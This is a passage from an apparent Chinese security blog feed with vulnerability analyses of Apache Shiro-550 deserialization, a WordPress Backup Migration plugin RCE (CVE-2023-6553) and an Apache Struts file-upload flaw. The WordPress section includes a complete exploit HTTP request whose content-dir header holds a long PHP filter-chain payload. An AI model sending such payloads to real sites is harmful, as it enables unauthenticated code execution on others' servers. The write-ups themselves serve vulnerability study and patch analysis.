SerializationException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (serialized<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> String msg<span style="color:#f92672">=</span><span style="color:#e6db74">"argument cannot be null."</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(msg);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> ByteArrayInputStream bais<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ByteArrayInputStream(serialized);</span></span><span style="display:flex;"><span> BufferedInputStream bis<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> BufferedInputStream(bais);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> ObjectInputStream ois<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ClassResolvingObjectInputStream(bis);</span></span><span style="display:flex;"><span> T deserialized<span style="color:#f92672">=</span> ois.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> ois.<span style="color:#a6e22e">close</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> deserialized;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (Exception var6) {</span></span><span style="display:flex;"><span> String msg<span style="color:#f92672">=</span><span style="color:#e6db74">"Unable to deserialze argument byte array."</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> SerializationException(msg, var6);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>会尝试调用ObjectInputStream.readObject方法，而ClassResolvingObjectInputStream类重写了resolveClass方法，因此会调用重写的resolveClass方法</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> Class<span style="color:#f92672">&lt;?></span> resolveClass(ObjectStreamClass osc)<span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ClassUtils.<span style="color:#a6e22e">forName</span>(osc.<span style="color:#a6e22e">getName</span>());</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (UnknownClassException var3) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> ClassNotFoundException(<span style="color:#e6db74">"Unable to load ObjectStreamClass ["</span><span style="color:#f92672">+</span> osc<span style="color:#f92672">+</span><span style="color:#e6db74">"]: "</span>, var3);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span> Class<span style="color:#a6e22e">forName</span>(String fqcn)<span style="color:#66d9ef">throws</span> UnknownClassException {</span></span><span style="display:flex;"><span> Class clazz<span style="color:#f92672">=</span> THREAD_CL_ACCESSOR.<span style="color:#a6e22e">loadClass</span>(fqcn);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (clazz<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isTraceEnabled</span>()) {</span></span><span style="display:flex;"><span> log.<span style="color:#a6e22e">trace</span>(<span style="color:#e6db74">"Unable to load class named ["</span><span style="color:#f92672">+</span> fqcn<span style="color:#f92672">+</span><span style="color:#e6db74">"] from the thread context ClassLoader. Trying the current ClassLoader..."</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> clazz<span style="color:#f92672">=</span> CLASS_CL_ACCESSOR.<span style="color:#a6e22e">loadClass</span>(fqcn);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (clazz<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isTraceEnabled</span>()) {</span></span><span style="display:flex;"><span> log.<span style="color:#a6e22e">trace</span>(<span style="color:#e6db74">"Unable to load class named ["</span><span style="color:#f92672">+</span> fqcn<span style="color:#f92672">+</span><span style="color:#e6db74">"] from the current ClassLoader. "</span><span style="color:#f92672">+</span><span style="color:#e6db74">"Trying the system/application ClassLoader..."</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> clazz<span style="color:#f92672">=</span> SYSTEM_CL_ACCESSOR.<span style="color:#a6e22e">loadClass</span>(fqcn);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (clazz<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> String msg<span style="color:#f92672">=</span><span style="color:#e6db74">"Unable to load class named ["</span><span style="color:#f92672">+</span> fqcn<span style="color:#f92672">+</span><span style="color:#e6db74">"] from the thread context, current, or "</span><span style="color:#f92672">+</span><span style="color:#e6db74">"system/application ClassLoaders. All heuristics have been exhausted. Class could not be found."</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> UnknownClassException(msg);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> clazz;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>跟进THREAD_CL_ACCESSOR.loadClass，在调试其中可以看到已经获取到TomcatEmbeddedWebAppClassLoader，并且将目标类java.util.PriorityQueue加载。</p><p><img alt="" src="/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/5.png"/></p><p>而后尝试反序列化该类，该类重写了readObject方法，在该方法断点，调用栈如下</p><pre tabindex="0"><code>readObject:782, PriorityQueue (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:1909, ObjectInputStream (java.io)
readOrdinaryObject:1808, ObjectInputStream (java.io)
readObject0:1353, ObjectInputStream (java.io)
readObject:373, ObjectInputStream (java.io)
deserialize:77, DefaultSerializer (org.apache.shiro.io)
deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)
convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)
getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)
getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)
resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)</code></pre><p><strong>代码执行</strong></p><p>通过传入<a href="/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/">CommonsBeanutils1 链</a>的序列化数据执行代码。</p><p>PoC<a href="https://paste.ubuntu.com/p/T5DNQXYm7H/" target="_blank">https://paste.ubuntu.com/p/T5DNQXYm7H/</a></p><h3 id="小结">小结</h3><p>由于代码中使用了固定的密钥，使得攻击者可以构造合法的加密数据，使得shiro反序列化攻击者的恶意数据，触发反序列化，通过CommonsBeanutils1反序列化链实现代码执行。</p><p><strong>参考链接</strong></p><blockquote><p><a href="http://www.luckysec.cn/posts/9db50098.html" target="_blank">http://www.luckysec.cn/posts/9db50098.html</a></p></blockquote><p><strong>Created at 2024-01-08T18:08:35+08:00</strong></p></description></item><item><title>CVE 2023 6553 Wordpress Backup Migration Plugin RCE</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/</link><pubDate>Fri, 29 Dec 2023 18:43:31 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/</guid><description><h3 id="基本信息">基本信息</h3><p>WordPress 的备份迁移插件的/includes/backup-heart.php 文件。这是由于攻击者能够控制传递给包含的值，并随后利用该值实现远程代码执行。</p><h3 id="影响版本">影响版本</h3><pre tabindex="0"><code>Backup Migration &lt;= 1.3.7</code></pre><h3 id="环境搭建">环境搭建</h3><p>参考<a href="https://github.com/docker/awesome-compose/tree/master/official-documentation-samples/wordpress/" target="_blank">https://github.com/docker/awesome-compose/tree/master/official-documentation-samples/wordpress/</a>使用docker启动</p><p>下载插件并启用<a href="https://downloads.wordpress.org/plugin/backup-backup.1.3.7.zip" target="_blank">https://downloads.wordpress.org/plugin/backup-backup.1.3.7.zip</a></p><h3 id="技术分析调试">技术分析&amp;调试</h3><p>查看<a href="https://plugins.trac.wordpress.org/changeset?old_path=%2Fbackup-backup%2Ftags%2F1.3.7%2Fincludes%2Fbackup-heart.php&amp;old=3009260&amp;new_path=%2Fbackup-backup%2Ftags%2F1.3.8%2Fincludes%2Fbackup-heart.php&amp;new=3009260&amp;sfp_email=&amp;sfph_mail=" target="_blank">补丁</a>可知通过控制HTTP头，可以控制后面require_once的参数，即攻击者可以通过控制HTTP头控制require_once的参数。</p><p><img alt="" src="/images/vulnerability/CVE-2023-6553-Wordpress-Backup-Migration-plugin-RCE.zh-cn.assets/1.png"/></p><p>参考<a href="/zh-cn/research/web/php-filter-rce/">PHP filter 代码执行</a></p><p>poc地址<code>https://github.com/synacktiv/php_filter_chain_generator</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /wp-content/plugins/backup-backup/includes/backup-heart.php<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.59.211</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span><span style="color:#ae81ff">zh-CN,en-US;q=0.7,en;q=0.3</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span><span style="color:#ae81ff">http://192.168.59.211/wp-admin/</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">wordpress_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Ca6e8acc150f152d2b5aa4d373e5ff828187efd0c9e212eab25859d55778a52e2; i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node019bmeisxrr5jql3o20jv87og13.node0; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_e9913da348dbccb312080f19f2d5f42e=admin%7C1702633600%7CBBAORunYr1sBsNJxoXPCZzDmitl6nf4o0pJSWDAC1y1%7Cb3a0f6ea3e6536b5e606de98a800e4156008295e564a757f1b36ed6a8077c9f7; wp-settings-time-1=1702463992</span></span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>content-dir<span style="color:#f92672">:</span><span style="color:#ae81ff">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">3</span></span></span></code></pre></div><h3 id="小结">小结</h3><p>虽然只能控制require后面的路径参数，由于PHP的动态性以及PHP filter的灵活性，攻击者可以通过PHP filter构造特殊的iconv 编码链让require获取到构造的恶意代码并执行。</p><p>其利用各种编码的RFC规定的特性来预置字符，是这个漏洞中最有意思的地方。</p><p><strong>补丁分析</strong></p><p>补丁中新增了<code>filterChainFix</code>函数，过滤请求头中的<code>ABSPATH</code>和<code>BMI_ROOT_DIR</code>，这个函数通过过滤PHP、<code>|</code>等并且严格限制参数长度来预防这个漏洞利用。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">31</span><span style="color:#75715e">// Filter and prevent PHP filter injection</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">32</span><span style="color:#66d9ef">function</span><span style="color:#a6e22e">filterChainFix</span>($content) {</span></span><span style="display:flex;"><span><span style="color:#ae81ff">33</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">34</span><span style="color:#75715e">// Make sure it exist and is string</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">35</span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_string</span>($content))<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">"Incorrect parameters."</span>);</span></span><span style="display:flex;"><span><span style="color:#ae81ff">36</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">37</span><span style="color:#75715e">// Check if it's not larger than max allowed path length (default systems)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">38</span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($content)<span style="color:#f92672">></span><span style="color:#ae81ff">256</span>)<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">"Incorrect parameters."</span>);</span></span><span style="display:flex;"><span><span style="color:#ae81ff">39</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">40</span><span style="color:#75715e">// Check if the path does not contain "php:"</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">41</span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($content,<span style="color:#e6db74">"php:"</span>))<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">"Incorrect parameters."</span>);</span></span><span style="display:flex;"><span><span style="color:#ae81ff">42</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">43</span><span style="color:#75715e">// Check if the path contain "|", it's not possible to use this character with our backups paths</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">44</span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($content,<span style="color:#e6db74">"|"</span>))<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">"Incorrect parameters."</span>);</span></span><span style="display:flex;"><span><span style="color:#ae81ff">45</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">46</span><span style="color:#75715e">// Check if the directory/file exist otherwise fail</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">47</span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">is_dir</span>($content)<span style="color:#f92672">||</span><span style="color:#a6e22e">file_exists</span>($content)))<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">"Incorrect parameters."</span>);</span></span><span style="display:flex;"><span><span style="color:#ae81ff">48</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">49</span><span style="color:#75715e">// Return correct content</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">50</span><span style="color:#66d9ef">return</span> $content;</span></span><span style="display:flex;"><span><span style="color:#ae81ff">51</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> }</span></span></code></pre></div><p><strong>参考链接</strong></p><blockquote><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution" target="_blank">https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution</a></p><p><a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it" target="_blank">https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it</a></p><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution" target="_blank">https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/backup-backup/backup-migration-137-unauthenticated-remote-code-execution</a></p></blockquote><p><strong>Created at 2023-12-29T18:43:31+08:00</strong></p></description></item><item><title>CVE-2023-50164 Apache Struts RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/</link><pubDate>Tue, 12 Dec 2023 11:18:52 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/</guid><description><h3 id="基本信息">基本信息</h3><p>由于 Struts 框架在处理参数名称大小写方面的不一致性，导致未经身份验证的远程攻击者能够通过修改参数名称的大小写来利用目录遍历技术上传恶意文件到服务器的非预期位置，最终导致代码执行。</p><h3 id="影响版本">影响版本</h3><pre tabindex="0"><code>2.0.0&lt;= Struts &lt;= 2.3.37
2.5.0 &lt;= Struts &lt;= 2.5.32
6.0.0 &lt;= Struts &lt;= 6.3.0</code></pre><h3 id="环境搭建">环境搭建</h3><p>使用vulhub起一个docker环境即可。</p><h3 id="技术分析调试">技术分析&amp;调试</h3><p>查看<a href="https://github.com/apache/struts/commit/4c044f12560e22e00520595412830f9582d6dac7#diff-9c690161b1ba4ba15ccf8b3991857785b66c99dd2a87a95543b18e411deeb17fL143-R170" target="_blank">补丁</a>可知，补丁修复前对于文件名超过<code>maxStringLength</code>时会将错误消息和<code>context</code>添加到<code>errors</code>之后直接返回，不会执行删除临时文件的逻辑，在修复代码中在finally语句中执行item.delete来删除临时文件。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> params.<span style="color:#a6e22e">put</span>(item.<span style="color:#a6e22e">getFieldName</span>(), values);</span></span><span style="display:flex;"><span> item.<span style="color:#a6e22e">delete</span>();</span></span></code></pre></div><p><img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/1.png"/></p><p>在<a href="https://github.com/apache/struts/commit/d8c69691ef1d15e76a5f4fcf33039316da2340b6" target="_blank">commit d8c69691ef1d15e76a5f4fcf33039316da2340b6</a>中主要有如下几个修复逻辑：
对于<code>appendAll</code>方法在添加参数之前先使用remove方法移除先前的参数。<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/4.png"/>
对于get方法，修改为对大小写不敏感<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/5.png"/></p><p>而<code>remove</code>方法和<code>contains</code>方法有如下修改：
原先的remove方法会区分大小写，而修复后，remove方法从entrySet中忽略大小写并删除对应的项。<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/6.png"/></p><p>可以看出这个commit主要是将键值对获取/移除的方法修改为大小写不敏感。</p><p>测试单元代码如下，添加了两个单元测试方法</p><ul><li><code>shouldGetBeCaseInsensitive</code></li><li><code>shouldAppendSameParamsIgnoringCase</code><code>shouldGetBeCaseInsensitive</code>测试<code>HttpParameters.get</code>方法是否是大小写不敏感。<code>shouldAppendSameParamsIgnoringCase</code>测试使用<code>HttpParameters.appendAll</code>向Map里面添加键值对时是否对key大小写不敏感。
可知修复主要是使得<code>HttpParameters</code>类的一些方法从大小写敏感改为大小写不敏感。
可以看出补丁主要是对<code>HttpParameters</code>进行修复。</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">HttpParametersTest</span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">@Test</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">shouldGetBeCaseInsensitive</span>() {</span></span><span style="display:flex;"><span><span style="color:#75715e">// given</span></span></span><span style="display:flex;"><span> HttpParameters params<span style="color:#f92672">=</span> HttpParameters.<span style="color:#a6e22e">create</span>(<span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">></span>() {{</span></span><span style="display:flex;"><span> put(<span style="color:#e6db74">"param1"</span>,<span style="color:#e6db74">"value1"</span>);</span></span><span style="display:flex;"><span> }}).<span 